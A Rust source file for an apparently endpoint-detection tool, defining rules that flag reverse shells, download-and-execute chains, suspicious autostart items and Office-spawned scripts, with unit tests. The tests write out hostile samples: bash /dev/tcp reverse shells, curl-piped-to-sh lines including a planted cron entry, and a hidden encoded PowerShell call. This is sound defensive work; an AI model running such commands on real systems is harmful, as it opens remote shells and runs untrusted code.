/// zedr Rules
///
/// The detection rules and the state they keep. The agent runs them over what its sensor sees,
/// and the proof program replays them over the same committed events, so both must stay one piece of code.
use borsh::{BorshDeserialize, BorshSerialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use zedr_ledger::Hash;
use zedr_protocol::{FileAction, FileEvent, InventoryAction, NetworkEvent, PersistenceEvent, PersistenceKind, ProcessAction, ProcessEvent, SensorEvent};

mod patterns;
pub mod proof;

/// Most processes the rules follow on one endpoint, the oldest is forgotten past it
pub const LIVE_LIMIT: usize = 20_000;

const NAME_BYTES: usize = 64;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Level {
    High,
    Medium,
    /// Not a finding of its own: it follows up on one
    Info,
}

impl Level {
    pub fn as_str(self) -> &'static str {
        match self {
            Level::High => "high",
            Level::Medium => "medium",
            Level::Info => "info",
        }
    }
}

/// What a match lets the control server open
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Opens {
    /// The process event and the event its parent entered with
    ProcessAndParent,
    /// The event itself, the process it belongs to and that process's parent
    EventProcessAndParent,
    /// The autostart item
    Item,
    /// The event that ended a process, and the event that process entered with
    EndAndProcess,
}

impl Opens {
    pub fn as_str(self) -> &'static str {
        match self {
            Opens::ProcessAndParent => "process and parent",
            Opens::EventProcessAndParent => "event, process and parent",
            Opens::Item => "autostart item",
            Opens::EndAndProcess => "end of the process and the process",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, BorshSerialize, BorshDeserialize)]
#[borsh(use_discriminant = true)]
#[repr(u8)]
pub enum RuleId {
    OfficeChild = 0,
    ServerChild = 1,
    EncodedCommand = 2,
    ReverseShell = 3,
    FetchAndRun = 4,
    ProxyNetwork = 5,
    ProxyLoadsWritable = 6,
    WritableImage = 7,
    DropsExecutable = 8,
    HiddenWindow = 9,
    ShellNetwork = 10,
    AutostartFetch = 11,
    AutostartWritable = 12,
    PreloadAdded = 13,
    RootKeyAdded = 14,
    FlaggedProcessEnded = 15,
}

impl RuleId {
    pub const ALL: [RuleId; 16] = [
        RuleId::OfficeChild,
        RuleId::ServerChild,
        RuleId::EncodedCommand,
        RuleId::ReverseShell,
        RuleId::FetchAndRun,
        RuleId::ProxyNetwork,
        RuleId::ProxyLoadsWritable,
        RuleId::WritableImage,
        RuleId::DropsExecutable,
        RuleId::HiddenWindow,
        RuleId::ShellNetwork,
        RuleId::AutostartFetch,
        RuleId::AutostartWritable,
        RuleId::PreloadAdded,
        RuleId::RootKeyAdded,
        RuleId::FlaggedProcessEnded,
    ];

    pub fn id(self) -> &'static str {
        match self {
            RuleId::OfficeChild => "office-child",
            RuleId::ServerChild => "server-child",
            RuleId::EncodedCommand => "encoded-command",
            RuleId::ReverseShell => "reverse-shell",
            RuleId::FetchAndRun => "fetch-and-run",
            RuleId::ProxyNetwork => "proxy-network",
            RuleId::ProxyLoadsWritable => "proxy-loads-writable",
            RuleId::WritableImage => "writable-image",
            RuleId::DropsExecutable => "drops-executable",
            RuleId::HiddenWindow => "hidden-window",
            RuleId::ShellNetwork => "shell-network",
            RuleId::AutostartFetch => "autostart-fetch",
            RuleId::AutostartWritable => "autostart-writable",
            RuleId::PreloadAdded => "preload-added",
            RuleId::RootKeyAdded => "root-key-added",
            RuleId::FlaggedProcessEnded => "flagged-process-ended",
        }
    }

    pub fn from_id(id: &str) -> Option<RuleId> {
        RuleId::ALL.into_iter().find(|rule| rule.id() == id)
    }

    pub fn title(self) -> &'static str {
        match self {
            RuleId::OfficeChild => "Office application started a script host",
            RuleId::ServerChild => "Server process started a shell",
            RuleId::EncodedCommand => "Encoded PowerShell command",
            RuleId::ReverseShell => "Shell wired to a socket",
            RuleId::FetchAndRun => "Download piped into execution",
            RuleId::ProxyNetwork => "System binary reached the network",
            RuleId::ProxyLoadsWritable => "System binary loaded code from a user-writable folder",
            RuleId::WritableImage => "Runs from a user-writable folder",
            RuleId::DropsExecutable => "Script host wrote an executable file",
            RuleId::HiddenWindow => "Hidden window",
            RuleId::ShellNetwork => "Shell with an outbound connection",
            RuleId::AutostartFetch => "Autostart item downloads and runs code",
            RuleId::AutostartWritable => "Autostart item runs from a temporary folder",
            RuleId::PreloadAdded => "Library preloaded into every process",
            RuleId::RootKeyAdded => "SSH key added for root",
            RuleId::FlaggedProcessEnded => "Process with a finding ended",
        }
    }

    /// ATT&CK technique of a finding, empty for a rule that only follows up on one
    pub fn technique(self) -> &'static str {
        match self {
            RuleId::OfficeChild => "T1204.002",
            RuleId::ServerChild => "T1505.003",
            RuleId::EncodedCommand => "T1059.001",
            RuleId::ReverseShell => "T1059.004",
            RuleId::FetchAndRun => "T1105",
            RuleId::ProxyNetwork => "T1218",
            RuleId::ProxyLoadsWritable => "T1218.011",
            RuleId::WritableImage => "T1204.002",
            RuleId::DropsExecutable => "T1105",
            RuleId::HiddenWindow => "T1564.003",
            RuleId::ShellNetwork => "T1071",
            RuleId::AutostartFetch => "T1547",
            RuleId::AutostartWritable => "T1547",
            RuleId::PreloadAdded => "T1574.006",
            RuleId::RootKeyAdded => "T1098.004",
            RuleId::FlaggedProcessEnded => "",
        }
    }

    /// Technique of an autostart finding, which follows the kind of item it was found in
    pub fn technique_for(self, kind: PersistenceKind) -> &'static str {
        match self {
            RuleId::AutostartFetch | RuleId::AutostartWritable => match kind {
                PersistenceKind::SystemdUnit => "T1543.002",
                PersistenceKind::SystemdTimer => "T1053.006",
                PersistenceKind::Cron => "T1053.003",
                PersistenceKind::ShellProfile => "T1546.004",
                PersistenceKind::AuthorizedKey => "T1098.004",
                PersistenceKind::LdPreload => "T1574.006",
                PersistenceKind::RcLocal | PersistenceKind::InitScript => "T1037.004",
            },
            other => other.technique(),
        }
    }

    pub fn level(self) -> Level {
        match self {
            RuleId::HiddenWindow | RuleId::ShellNetwork | RuleId::RootKeyAdded => Level::Medium,
            RuleId::FlaggedProcessEnded => Level::Info,
            _ => Level::High,
        }
    }

    pub fn opens(self) -> Opens {
        match self {
            RuleId::ProxyNetwork | RuleId::ShellNetwork | RuleId::DropsExecutable => Opens::EventProcessAndParent,
            RuleId::AutostartFetch | RuleId::AutostartWritable | RuleId::PreloadAdded | RuleId::RootKeyAdded => Opens::Item,
            RuleId::FlaggedProcessEnded => Opens::EndAndProcess,
            _ => Opens::ProcessAndParent,
        }
    }
}

const OFFICE: &[&str] = &[
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "onenote.exe",
    "msaccess.exe",
    "mspub.exe",
    "visio.exe",
    "acrord32.exe",
    "acrobat.exe",
    "soffice.bin",
    "microsoft word",
    "microsoft excel",
    "microsoft powerpoint",
    "microsoft outlook",
];
const SHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "pwsh", "cmd.exe", "wscript.exe", "cscript.exe", "bash", "sh", "zsh", "dash", "fish", "osascript"];
const PROXIES: &[&str] =
    &["rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "msiexec.exe", "installutil.exe", "wmic.exe", "cmstp.exe", "odbcconf.exe"];
const SERVERS: &[&str] = &["w3wp.exe", "sqlservr.exe", "httpd", "apache2", "nginx", "php-fpm", "postgres", "mysqld", "mariadbd", "redis-server", "mongod"];
const POWERSHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "pwsh"];

/// File name of a path in lower case, cut to a length no rule needs more of so one long name cannot bloat the state
pub fn base_name(path: &str) -> String {
    let mut name = path.rsplit(['\\', '/']).next().unwrap_or(path).to_ascii_lowercase();
    if name.len() > NAME_BYTES {
        let mut end = NAME_BYTES;
        while !name.is_char_boundary(end) {
            end -= 1;
        }
        name.truncate(end);
    }
    name
}

/// One rule that fired, with the committed events it relied on
#[derive(Debug, Clone, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
pub struct Match {
    /// Index of the event that made the rule fire
    pub trigger: u64,
    pub rule: RuleId,
    /// Indices of the earlier events the rule read: the process's own entry, then its parent's
    pub context: Vec<u64>,
    pub pid: u32,
    pub started_at: u64,
}

impl Match {
    /// Every event this match opens, the trigger first
    pub fn opened(&self) -> impl Iterator<Item = u64> + '_ {
        std::iter::once(self.trigger).chain(self.context.iter().copied())
    }
}

#[derive(Debug, Clone, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
struct Parent {
    name: String,
    index: u64,
}

#[derive(Debug, Clone, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
struct Process {
    name: String,
    started_at: u64,
    /// Index of the event this process entered the table with
    index: u64,
    parent: Option<Parent>,
}

/// Everything the rules remember about one endpoint between events
#[derive(Debug, Clone, Default, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
pub struct State {
    live: BTreeMap<u32, Process>,
    fired: BTreeSet<(RuleId, u32, u64)>,
    fired_items: BTreeSet<(RuleId, Hash)>,
}

impl State {
    /// Canonical bytes, the form a state commitment is taken over
    pub fn to_bytes(&self) -> Vec<u8> {
        borsh::to_vec(self).expect("the rule state always encodes")
    }

    pub fn from_bytes(bytes: &[u8]) -> Result<Self, String> {
        borsh::from_slice(bytes).map_err(|e| format!("Not a canonical rule state: {}", e))
    }

    /// Indices of the entry events a later match may still open
    pub fn referenced(&self) -> BTreeSet<u64> {
        self.live.values().flat_map(|process| std::iter::once(process.index).chain(process.parent.iter().map(|parent| parent.index))).collect()
    }

    /// Feeds the next committed event to the rules and returns what fired
    pub fn observe(&mut self, index: u64, event: &SensorEvent) -> Vec<Match> {
        match event {
            SensorEvent::Process(process) => self.process(index, process),
            SensorEvent::Network(connection) => self.network(index, connection),
            SensorEvent::File(file) => self.file(index, file),
            SensorEvent::Persistence(item) => self.persistence(index, item),
            SensorEvent::Package(_) => Vec::new(),
        }
    }

    fn forget(&mut self, pid: u32) {
        if let Some(ended) = self.live.remove(&pid) {
            self.fired.retain(|(_, fired_pid, started_at)| !(*fired_pid == pid && *started_at == ended.started_at));
        }
    }

    fn forget_oldest(&mut self) {
        let oldest = self.live.iter().min_by_key(|(pid, process)| (process.started_at, **pid)).map(|(pid, _)| *pid);
        if let Some(pid) = oldest {
            self.forget(pid);
        }
    }

    fn process(&mut self, index: u64, event: &ProcessEvent) -> Vec<Match> {
        if matches!(event.action, ProcessAction::Terminate) {
            let ended = self
                .live
                .get(&event.pid)
                .filter(|process| self.fired.iter().any(|(_, pid, started_at)| *pid == event.pid && *started_at == process.started_at));
            let follow_up = ended.map(|process| Match {
                trigger: index,
                rule: RuleId::FlaggedProcessEnded,
                context: vec![process.index],
                pid: event.pid,
                started_at: process.started_at,
            });
            self.forget(event.pid);
            return follow_up.into_iter().collect();
        }

        let started_at = match (&event.action, self.live.get(&event.pid)) {
            (ProcessAction::Modify, Some(running)) => running.started_at,
            _ => event.timestamp,
        };
        let parent = self.live.get(&event.ppid).filter(|_| event.ppid != event.pid).map(|parent| Parent { name: parent.name.clone(), index: parent.index });
        let process = Process { name: base_name(&event.executable_path), started_at, index, parent };

        let name = process.name.as_str();
        let parent_name = process.parent.as_ref().map(|parent| parent.name.as_str()).unwrap_or("");
        let command = event.command_line.join(" ");
        let arguments = command.split_once(' ').map(|(_, rest)| rest).unwrap_or("");
        let scripted = SHELLS.contains(&name) || PROXIES.contains(&name);
        let mut matched = Vec::new();
        if scripted && OFFICE.contains(&parent_name) {
            matched.push(RuleId::OfficeChild);
        }
        if SHELLS.contains(&name) && SERVERS.contains(&parent_name) {
            matched.push(RuleId::ServerChild);
        }
        if POWERSHELLS.contains(&name) && patterns::encoded(&command) {
            matched.push(RuleId::EncodedCommand);
        }
        let scanned = patterns::Command::new(&command);
        if scanned.reverse() {
            matched.push(RuleId::ReverseShell);
        }
        if scanned.fetched() {
            matched.push(RuleId::FetchAndRun);
        }
        if PROXIES.contains(&name) && patterns::writable(arguments) {
            matched.push(RuleId::ProxyLoadsWritable);
        }
        if patterns::writable(&event.executable_path) {
            matched.push(RuleId::WritableImage);
        }
        if SHELLS.contains(&name) && patterns::hidden(&command) {
            matched.push(RuleId::HiddenWindow);
        }

        if self.live.len() >= LIVE_LIMIT && !self.live.contains_key(&event.pid) {
            self.forget_oldest();
        }
        self.live.insert(event.pid, process);
        matched.into_iter().filter_map(|rule| self.fire(rule, event.pid, index)).collect()
    }

    fn network(&mut self, index: u64, event: &NetworkEvent) -> Vec<Match> {
        let Some(process) = self.live.get(&event.pid) else {
            return Vec::new();
        };
        let name = process.name.as_str();
        let rule = if PROXIES.contains(&name) {
            RuleId::ProxyNetwork
        } else if SHELLS.contains(&name) {
            RuleId::ShellNetwork
        } else {
            return Vec::new();
        };
        self.fire(rule, event.pid, index).into_iter().collect()
    }

    fn file(&mut self, index: u64, event: &FileEvent) -> Vec<Match> {
        let writes = !matches!(event.action, FileAction::Read | FileAction::Delete);
        let Some(process) = self.live.get(&event.pid) else {
            return Vec::new();
        };
        if !writes || !SHELLS.contains(&process.name.as_str()) || !patterns::dropped(&event.path) {
            return Vec::new();
        }
        self.fire(RuleId::DropsExecutable, event.pid, index).into_iter().collect()
    }

    fn fire(&mut self, rule: RuleId, pid: u32, trigger: u64) -> Option<Match> {
        let process = self.live.get(&pid)?;
        if !self.fired.insert((rule, pid, process.started_at)) {
            return None;
        }
        let mut context = Vec::new();
        if process.index != trigger {
            context.push(process.index);
        }
        if let Some(parent) = &process.parent {
            context.push(parent.index);
        }
        Some(Match { trigger, rule, context, pid, started_at: process.started_at })
    }

    fn persistence(&mut self, index: u64, event: &PersistenceEvent) -> Vec<Match> {
        let item = item_key(event);
        if !matches!(event.action, InventoryAction::Present) {
            self.fired_items.retain(|(_, fired)| *fired != item);
        }
        if matches!(event.action, InventoryAction::Removed) {
            return Vec::new();
        }

        let fresh = matches!(event.action, InventoryAction::Added | InventoryAction::Changed);
        let mut matched = Vec::new();
        let scanned = patterns::Command::new(&event.command);
        if scanned.fetched() || scanned.reverse() {
            matched.push(RuleId::AutostartFetch);
        }
        if patterns::writable(&event.command) {
            matched.push(RuleId::AutostartWritable);
        }
        if fresh && event.kind == PersistenceKind::LdPreload {
            matched.push(RuleId::PreloadAdded);
        }
        if event.kind == PersistenceKind::AuthorizedKey && event.user == "root" && matches!(event.action, InventoryAction::Added) {
            matched.push(RuleId::RootKeyAdded);
        }

        if self.fired_items.len() >= LIVE_LIMIT {
            self.fired_items.clear();
        }
        matched
            .into_iter()
            .filter(|rule| self.fired_items.insert((*rule, item)))
            .map(|rule| Match { trigger: index, rule, context: Vec::new(), pid: 0, started_at: event.timestamp })
            .collect()
    }
}

fn item_key(event: &PersistenceEvent) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(borsh::to_vec(&(event.kind, &event.path, &event.name)).expect("an item key always encodes"));
    hasher.finalize().into()
}

#[cfg(test)]
mod tests {
    use super::*;
    use zedr_protocol::NetworkAction;

    const SYSTEM: &str = "C:\\Windows\\System32\\";

    fn run(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
        let mut command_line = vec![path.to_string()];
        command_line.extend(args.iter().map(|arg| arg.to_string()));
        SensorEvent::Process(ProcessEvent {
            timestamp,
            pid,
            ppid,
            executable_path: path.to_string(),
            command_line,
            action: ProcessAction::Create,
            uid: 1000,
            hash: None,
        })
    }

    fn end(timestamp: u64, pid: u32) -> SensorEvent {
        SensorEvent::Process(ProcessEvent {
            timestamp,
            pid,
            ppid: 0,
            executable_path: String::new(),
            command_line: Vec::new(),
            action: ProcessAction::Terminate,
            uid: 0,
            hash: None,
        })
    }

    fn connect(timestamp: u64, pid: u32) -> SensorEvent {
        SensorEvent::Network(NetworkEvent {
            timestamp,
            pid,
            process_path: String::new(),
            protocol: "tcp".to_string(),
            source_ip: "10.0.0.5".to_string(),
            source_port: 50000,
            dest_ip: "203.0.113.9".to_string(),
            dest_port: 443,
            action: NetworkAction::Connect,
            bytes_sent: 1,
            bytes_received: 1,
        })
    }

    fn write(timestamp: u64, pid: u32, path: &str) -> SensorEvent {
        SensorEvent::File(FileEvent { timestamp, path: path.to_string(), action: FileAction::Write, pid, process_path: String::new(), hash: None })
    }

    fn matches(state: &mut State, first: u64, events: &[SensorEvent]) -> Vec<Match> {
        events.iter().enumerate().flat_map(|(offset, event)| state.observe(first + offset as u64, event)).collect()
    }

    fn rules(state: &mut State, events: &[SensorEvent]) -> Vec<&'static str> {
        matches(state, 0, events).into_iter().map(|found| found.rule.id()).collect()
    }

    #[test]
    fn test_macro_dropper_is_read_end_to_end() {
        let powershell = format!("{}WindowsPowerShell\\v1.0\\powershell.exe", SYSTEM);
        let rundll32 = format!("{}rundll32.exe", SYSTEM);
        let mut state = State::default();
        let fired = rules(
            &mut state,
            &[
                run(1, 10, 0, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", &[]),
                run(2, 11, 10, &powershell, &["-nop", "-w", "hidden", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"]),
                connect(3, 11),
                write(4, 11, "C:\\Users\\Public\\update.dll"),
                run(5, 12, 11, &rundll32, &["C:\\Users\\Public\\update.dll,Start"]),
                connect(6, 12),
            ],
        );
        assert_eq!(
            fired,
            vec!["office-child", "encoded-command", "hidden-window", "shell-network", "drops-executable", "proxy-loads-writable", "proxy-network"]
        );
    }

    #[test]
    fn test_web_shell_reverse_shell_and_dropped_binary_on_linux() {
        let mut state = State::default();
        let fired = rules(
            &mut state,
            &[
                run(1, 20, 0, "/usr/sbin/nginx", &[]),
                run(2, 21, 20, "/bin/sh", &["-c", "id"]),
                run(3, 22, 21, "/bin/bash", &["-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"]),
                run(4, 23, 0, "/bin/sh", &["-c", "curl -s http://203.0.113.9/a | sh"]),
                run(5, 24, 0, "/tmp/.x/kworker", &[]),
            ],
        );
        assert_eq!(fired, vec!["server-child", "reverse-shell", "fetch-and-run", "writable-image"]);
    }

    #[test]
    fn test_ordinary_build_and_server_work_is_quiet() {
        let mut state = State::default();
        let fired = rules(
            &mut state,
            &[
                run(1, 30, 0, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
                run(2, 31, 30, &format!("{}cmd.exe", SYSTEM), &["/c", "npm", "ci"]),
                run(3, 32, 31, "C:\\Program Files\\nodejs\\node.exe", &["install.js"]),
                connect(4, 32),
                run(5, 33, 0, "C:\\Python312\\python.exe", &["worker.py"]),
                connect(6, 33),
                run(7, 34, 0, "C:\\Program Files\\PowerShell\\7\\pwsh.exe", &[]),
                run(8, 35, 0, &format!("{}rundll32.exe", SYSTEM), &["C:\\Windows\\System32\\shell32.dll,Control_RunDLL"]),
                run(9, 36, 0, "/usr/bin/curl", &["-o", "/tmp/report.csv", "https://example.com/report.csv"]),
                write(10, 33, "C:\\Users\\Public\\result.dll"),
            ],
        );
        assert!(fired.is_empty(), "nothing should fire, got {:?}", fired);
    }

    #[test]
    fn test_a_finding_fires_once_per_process_even_when_the_agent_resends_it() {
        let mut state = State::default();
        let shell = run(100, 40, 0, "/bin/bash", &["deploy.sh"]);
        assert_eq!(rules(&mut state, &[shell.clone(), connect(101, 40), connect(102, 40), shell, connect(103, 40)]), vec!["shell-network"]);

        assert_eq!(
            rules(&mut state, &[end(110, 40), run(120, 40, 0, "/bin/bash", &["deploy.sh"]), connect(121, 40)]),
            vec!["flagged-process-ended", "shell-network"]
        );
    }

    #[test]
    fn test_the_end_of_a_process_is_opened_only_when_that_process_had_a_finding() {
        let mut state = State::default();
        let found = matches(
            &mut state,
            50,
            &[
                run(1, 20, 0, "/usr/sbin/nginx", &[]),
                run(2, 21, 20, "/bin/sh", &["-c", "id"]),
                run(3, 22, 0, "/usr/bin/sleep", &["60"]),
                end(4, 22),
                end(5, 21),
                end(6, 20),
                end(7, 21),
            ],
        );
        assert_eq!(
            found,
            vec![
                Match { trigger: 51, rule: RuleId::ServerChild, context: vec![50], pid: 21, started_at: 2 },
                Match { trigger: 54, rule: RuleId::FlaggedProcessEnded, context: vec![51], pid: 21, started_at: 2 },
            ],
            "the quiet process, the parent and an end reported twice open nothing"
        );
        assert!(state.fired.is_empty() && state.live.is_empty());

        let reused = matches(&mut state, 60, &[run(8, 21, 0, "/usr/bin/sleep", &["60"]), end(9, 21)]);
        assert!(reused.is_empty(), "a later process with the same pid carries no finding");
    }

    #[test]
    fn test_the_process_table_stops_growing_at_its_limit() {
        let mut state = State::default();
        let last = LIVE_LIMIT as u32 + 1;
        for pid in 1..=last {
            state.observe(u64::from(pid), &run(u64::from(pid), pid, 0, "/usr/bin/sleep", &["60"]));
        }
        assert_eq!(state.live.len(), LIVE_LIMIT);
        assert!(!state.live.contains_key(&1));
        assert!(state.live.contains_key(&2));
        assert!(state.live.contains_key(&last));
    }

    fn autostart(action: InventoryAction, kind: PersistenceKind, name: &str, path: &str, command: &str, user: &str) -> SensorEvent {
        SensorEvent::Persistence(PersistenceEvent {
            timestamp: 500,
            action,
            kind,
            name: name.to_string(),
            path: path.to_string(),
            command: command.to_string(),
            user: user.to_string(),
            enabled: true,
            hash: None,
        })
    }

    #[test]
    fn test_planted_autostart_items_are_found_and_ordinary_ones_are_quiet() {
        let mut state = State::default();
        let planted = autostart(
            InventoryAction::Added,
            PersistenceKind::Cron,
            "sysupdate",
            "/etc/cron.d/sysupdate",
            "* * * * * root curl -fsS http://203.0.113.47/u | sh",
            "root",
        );
        let found = state.observe(7, &planted);
        assert_eq!(found, vec![Match { trigger: 7, rule: RuleId::AutostartFetch, context: Vec::new(), pid: 0, started_at: 500 }]);
        assert_eq!(found[0].rule.technique_for(PersistenceKind::Cron), "T1053.003");

        let resent = autostart(
            InventoryAction::Present,
            PersistenceKind::Cron,
            "sysupdate",
            "/etc/cron.d/sysupdate",
            "* * * * * root curl -fsS http://203.0.113.47/u | sh",
            "root",
        );
        assert!(state.observe(8, &resent).is_empty(), "an agent that looks again reports the item again");

        let quiet = [
            autostart(
                InventoryAction::Present,
                PersistenceKind::SystemdUnit,
                "ssh.service",
                "/usr/lib/systemd/system/ssh.service",
                "/usr/sbin/sshd -D",
                "root",
            ),
            autostart(InventoryAction::Added, PersistenceKind::Cron, "certbot", "/etc/cron.d/certbot", "0 */12 * * * root certbot -q renew", "root"),
            autostart(InventoryAction::Present, PersistenceKind::AuthorizedKey, "admin@laptop", "/root/.ssh/authorized_keys", "ssh-ed25519", "root"),
            autostart(InventoryAction::Present, PersistenceKind::LdPreload, "libjemalloc.so", "/etc/ld.so.preload", "/usr/lib/libjemalloc.so", "root"),
            autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "deploy@ci", "/home/deploy/.ssh/authorized_keys", "ssh-ed25519", "deploy"),
        ];
        assert!(rules(&mut state, &quiet).is_empty());

        let loud = [
            autostart(
                InventoryAction::Added,
                PersistenceKind::SystemdUnit,
                "dbus-helper.service",
                "/etc/systemd/system/dbus-helper.service",
                "/tmp/.cache/kworker",
                "root",
            ),
            autostart(
                InventoryAction::Added,
                PersistenceKind::LdPreload,
                "libprocesshider.so",
                "/etc/ld.so.preload",
                "/usr/local/lib/libprocesshider.so",
                "root",
            ),
            autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519", "root"),
        ];
        assert_eq!(rules(&mut state, &loud), ["autostart-writable", "preload-added", "root-key-added"]);
    }

    #[test]
    fn test_an_autostart_item_that_comes_back_is_reported_again() {
        let mut state = State::default();
        let command = "bash -i >& /dev/tcp/203.0.113.47/443 0>&1";
        let item = |action| autostart(action, PersistenceKind::ShellProfile, ".bashrc", "/root/.bashrc", command, "root");
        assert_eq!(rules(&mut state, &[item(InventoryAction::Changed)]), ["autostart-fetch"]);
        assert!(rules(&mut state, &[item(InventoryAction::Removed)]).is_empty());
        assert_eq!(rules(&mut state, &[item(InventoryAction::Added)]), ["autostart-fetch"]);
    }

    #[test]
    fn test_a_match_names_the_events_it_relied_on() {
        let mut state = State::default();
        let found = matches(&mut state, 100, &[run(1, 20, 0, "/usr/sbin/nginx", &[]), run(2, 21, 20, "/bin/sh", &["-c", "id"]), connect(3, 21)]);
        assert_eq!(
            found,
            vec![
                Match { trigger: 101, rule: RuleId::ServerChild, context: vec![100], pid: 21, started_at: 2 },
                Match { trigger: 102, rule: RuleId::ShellNetwork, context: vec![101, 100], pid: 21, started_at: 2 },
            ]
        );
        assert_eq!(found[1].opened().collect::<Vec<_>>(), vec![102, 101, 100]);
        assert_eq!(state.referenced(), BTreeSet::from([100, 101]));

        let orphan = matches(&mut state, 200, &[run(9, 30, 0, "/tmp/.x/kworker", &[])]);
        assert_eq!(orphan, vec![Match { trigger: 200, rule: RuleId::WritableImage, context: Vec::new(), pid: 30, started_at: 9 }]);
    }

    #[test]
    fn test_the_state_survives_its_canonical_encoding_and_behaves_the_same_after() {
        let events = [
            run(1, 20, 0, "/usr/sbin/nginx", &[]),
            run(2, 21, 20, "/bin/sh", &["-c", "id"]),
            autostart(InventoryAction::Added, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "curl http://203.0.113.47/u | sh", "root"),
            connect(3, 21),
            run(4, 22, 21, "/bin/bash", &["-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"]),
            end(5, 21),
            connect(6, 22),
        ];
        let mut whole = State::default();
        let expected = matches(&mut whole, 0, &events);

        for split in 0..=events.len() {
            let mut state = State::default();
            let mut found = matches(&mut state, 0, &events[..split]);
            let bytes = state.to_bytes();
            let mut restored = State::from_bytes(&bytes).unwrap();
            assert_eq!(restored, state);
            assert_eq!(restored.to_bytes(), bytes, "the encoding is canonical");
            found.extend(matches(&mut restored, split as u64, &events[split..]));
            assert_eq!(found, expected, "split at {}", split);
            assert_eq!(restored, whole);
        }
    }

    #[test]
    fn test_names_are_folded_in_ascii_and_cut_on_a_character_boundary() {
        assert_eq!(base_name("C:\\Windows\\System32\\CMD.EXE"), "cmd.exe");
        assert_eq!(base_name("/usr/bin/\u{c9}COLE"), "\u{c9}cole", "only ASCII letters are folded");
        let long = format!("/opt/{}", "\u{e9}".repeat(60));
        let name = base_name(&long);
        assert!(name.len() <= NAME_BYTES && name.chars().all(|c| c == '\u{e9}'));
        assert_eq!(base_name("no-separator"), "no-separator");
    }

    #[test]
    fn test_every_rule_has_one_identifier_and_its_metadata() {
        let ids: BTreeSet<&str> = RuleId::ALL.iter().map(|rule| rule.id()).collect();
        assert_eq!(ids.len(), RuleId::ALL.len());
        for rule in RuleId::ALL {
            assert_eq!(RuleId::from_id(rule.id()), Some(rule));
            assert_eq!(borsh::from_slice::<RuleId>(&borsh::to_vec(&rule).unwrap()).unwrap(), rule);
            assert!(!rule.title().is_empty());
            assert_eq!(rule.technique().starts_with('T'), rule.level() != Level::Info, "a finding names its technique, a follow-up has none");
        }
        assert_eq!(RuleId::from_id("no-such-rule"), None);
        assert_eq!(RuleId::ShellNetwork.level(), Level::Medium);
        assert_eq!(RuleId::FetchAndRun.opens(), Opens::ProcessAndParent);
        assert_eq!(RuleId::ProxyNetwork.opens(), Opens::EventProcessAndParent);
        assert_eq!(RuleId::RootKeyAdded.opens(), Opens::Item);
        assert_eq!((RuleId::FlaggedProcessEnded.level(), RuleId::FlaggedProcessEnded.opens()), (Level::Info, Opens::EndAndProcess));
    }
}
